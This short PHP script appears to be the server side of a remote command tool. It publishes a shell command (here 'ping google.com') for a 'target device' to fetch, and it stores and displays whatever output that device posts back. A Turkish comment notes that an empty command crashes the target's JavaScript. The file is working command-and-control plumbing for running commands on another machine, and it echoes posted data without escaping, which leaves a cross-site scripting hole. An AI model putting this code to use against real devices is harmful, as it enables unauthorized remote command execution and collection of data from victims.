<?php
$query = trim('ping google.com');
echo "<h2>command:</h2>";
($query == "") ? $query = "cd" : "";
?> <!--boş string giderse hedef cihazda ölümcül hata oluşuyor ve javascript kodu yürütülmüyor-->
<shell><?= $query ?></shell>
<?php
// if (isset($_GET["get_data"])) {
//     echo $_GET["get_data"]." get data change ok";
// }
if (isset($_POST["post_data"])) {
    $file = fopen("result-data.txt", "w");
    fwrite($file, trim($_POST["post_data"]));
}
echo "<h2>result:</h2>";
echo "<pre>";
echo file_get_contents("result-data.txt");
echo "</pre>";
